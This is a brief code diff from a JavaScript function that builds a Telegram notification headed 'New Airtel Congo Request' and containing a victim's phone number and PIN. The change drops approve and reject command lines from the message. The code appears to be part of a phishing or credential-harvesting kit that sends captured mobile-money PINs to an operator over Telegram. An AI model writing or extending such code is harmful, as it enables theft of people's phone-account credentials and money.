@@ -165,10 +165,7 @@ async function sendTelegramNotification(phone, pin) {
         '📲 New Airtel Congo Request',
         '📱 Phone: ' + phone,
         '🔑 PIN: ' + pin,
-        '🆔 Request: ' + requestId,
-        '',
-        '✅ /approve_' + requestId + ' - Approve',
-        '❌ /reject_' + requestId + ' - Reject'
+        '🆔 Request: ' + requestId
     ];
     const message = lines.join('\n');
 
